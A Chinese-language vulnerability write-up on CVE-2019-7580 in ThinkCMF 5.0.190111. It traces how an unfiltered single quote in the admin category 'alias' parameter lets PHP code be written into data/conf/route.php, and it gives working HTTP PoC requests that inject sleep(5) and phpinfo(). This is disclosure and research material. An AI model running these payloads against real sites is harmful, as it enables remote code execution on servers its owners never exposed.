<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="2312ba727fbed028278ca56f8e44fee8">0x00 环境搭建</h1>
<p>首先去thinkcmf下载5.0的最新版<br/>
<a href="https://github.com/thinkcmf/thinkcmf/archive/5.0.190111.zip" target="_blank">https://github.com/thinkcmf/thinkcmf/archive/5.0.190111.zip</a><br/>
切换到web根目录下，比如/var/www，然后新建一个目录：ThinkCMF-5.0.190111<br/>
把除public目录外的文件都移动到ThinkCMF-5.0.190111下。然后修改index.php，将其中的</p>
<div class="highlight"><pre><span></span><span class="x">define('CMF_ROOT', __DIR__ . '/../');</span>
</pre></div>
<p>修改为</p>
<div class="highlight"><pre><span></span><span class="x">define('CMF_ROOT', __DIR__ . '/ThinkCMF-5.0.190111/');</span>
</pre></div>
<p>然后一步步完成安装。<br/>
参考：<a href="https://blog.csdn.net/youaregoo/article/details/82219722" target="_blank">https://blog.csdn.net/youaregoo/article/details/82219722</a></p>
<h1 data-content="1" id="ab0bba96573857c734912cf57baf22e0">0x01 利用过程：</h1>
<p>后台登录状态下，<br/>
1、将payload插入数据库并读取然后写入data/conf/route.php文件</p>
<div class="highlight"><pre><span></span><span class="err">POST /portal/admin_category/addpost.html</span>
<span class="err">parent_id=0&amp;name=111&amp;alias=a'=&gt;array(%22%22)%2csleep(5)%2c'b</span>
</pre></div>
<p>2、然后访问：</p>
<pre><code>/portal/admin_category/index.html</code></pre>
<p>触发</p>
<pre><code>include data/conf/route.php</code></pre>
<p>操作，执行payload。下图以执行sleep(5)作为演示。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129220530-efd574a2-23ce-1.png"/></p>
<h1 data-content="1" id="da5f1f2491a9958ba25c5142fb5b8d3c">0x02 利用过程与分析</h1>
<h2 data-content="1" id="d7ae7c6454e8304b6f6444e668f6f2da">1、将payload插入数据库，写入data/conf/route.php文件</h2>
<p>程序的入口是index.php,在index.php中\think\App::run()执行应用。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129221202-d9a0df0e-23cf-1.png"/></p>
<p>在App.php的run()函数139行，执行sef::exec();</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129221341-143431a2-23d0-1.png"/></p>
<p>通过解析url，得到处理此次请求的控制器、类、函数，即<code>AdminCategoryController.php</code>的<code>addPost</code>函数。然后调用<code>self::invokeMethod()</code>。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129221441-37ffbbd8-23d0-1.png"/></p>
<p>通过反射执行<code>AdminCategoryController.php</code>的<code>addPost</code>函数。<br/>
在addPost函数中，从$this-&gt;request-&gt;param()函数中得到请求中的参数传递给$data。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129221603-690557ce-23d0-1.png"/></p>
<p>然后通过$this-&gt;validata调用父类(./simplewind/thinkphp/library/think/Controller.php)的validata函数进行过滤。然后将$data传入<code>./app/portal/model/PortalCategoryModel.php</code>的addCategory函数进行实际的"添加分类"操作。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129221711-918e8c56-23d0-1.png"/></p>
<p>在addCategory函数中，184行这一句：</p>
<div class="highlight"><pre><span></span><span class="x">$findRoute = $this-&gt;where('full_url', $fullUrl)-&gt;find();</span>
</pre></div>
<p>通过查询数据中是否存在对应的url，由于是第一次插入，所以这里并没有查到。<br/>
154行和155行通过<code>setRoute</code>函数对数据库进行了两次插入操作。<br/>
根入<code>setRoute</code>函数，<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129221758-ad6db582-23d0-1.png"/></p>
<p>其中$fullUrl和$url的值如截图所示。<br/>
继续跟，</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129221833-c2b4cc28-23d0-1.png"/></p>
<p>在34行从数据库中查询查询相关数据，</p>
<div class="highlight"><pre><span></span><span class="x">$routes      = $this-&gt;where("status", 1)-&gt;order("list_order asc")-&gt;select();</span>
</pre></div>
<p>在<code>addCategory</code>函数的157行调用</p>
<pre><code>$routeModel-&gt;getRoutes(true);</code></pre>
<p>最终得到<code>$allroutes</code>的值,创建<code>data/conf</code>目录，然后拼接待写入的<code>route.php</code>文件的完整路径，最后调用<code>file_put_contents()</code>完成写入。可见这个漏洞在于没有对<code>alias</code>参数中的单引号进行过滤，导致可通过闭合前后的单引号插入用户可控的payload。<br/>
写入前后对比如下：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129221940-ea85dd96-23d0-1.png"/></p>
<h2 data-content="1" id="4f91ac1da0927b894f2246a95c637e11">2、触发payload执行</h2>
<p>带着登录的cookie访问<code>/portal/admin_category/index.html</code>，调用<code>routeCheck</code>函数进行url路由检测</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129222457-a73ff2f0-23d1-1.png"/></p>
<p>这里先</p>
<div class="highlight"><pre><span></span><span class="x">include app/route.php</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129223913-a57cba46-23d3-1.png"/><br/>
然后，</p>
<div class="highlight"><pre><span></span><span class="x">include data/conf/route.php</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129223953-bd45163c-23d3-1.png"/><br/>
最终执行我们的payload：<code>phpinfo()</code>。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129224017-cbd95fc8-23d3-1.png"/></p>
<h1 data-content="1" id="86d665fd12ce593356a7d47453dce809">0x03 Demo</h1>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190128190412-7194b41e-22ec-1.gif"/></p>
<h1 data-content="1" id="6390a00303bcd660151302366571bd9f">0x04 附PoC：</h1>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/portal/admin_category/addpost.html</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.170.209</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">183</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=of2ar92rpeucrh4cg6s4t4dae6; admin_username=admin</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

parent_id=0&amp;name=111&amp;alias=1'%3D%3Earray(%22%22)%2Cphpinfo()%2C'2
</pre></div>
<h1 data-content="1" id="81e4529bc545499190920c84e10bd2c5">0x05 后记</h1>
<p>2月7日分配了CVE编号：<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-7580" target="_blank">CVE-2019-7580</a></p>
<blockquote>
<p>ThinkCMF 5.0.190111 allows remote attackers to execute arbitrary PHP code via the portal/admin_category/addpost.html alias parameter because the mishandling of a single quote character allows data/conf/route.php injection.</p>
</blockquote>
<p>这个漏洞是在复现thinkcmf的<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6713" target="_blank">CVE-2019-6713</a>的时候发现的。<br/>
根据其描述</p>
<blockquote>
<p>by using vectors involving portal/List/index and list/:id to inject this code into data\conf\route.php, as demonstrated by a file_put_contents call.</p>
</blockquote>
<p>提到<code>file_put_contents</code>，猜想这可能是一个文件写入漏洞。然后搜索route.php，发现<code>添加分类</code>处可以写入该文件。</p>
<h1 data-content="1" id="d4ee54bff9d8ad594d94d17412bf3dde">0x06 参考</h1>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6713" target="_blank">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6713</a></p>
</div>
</div>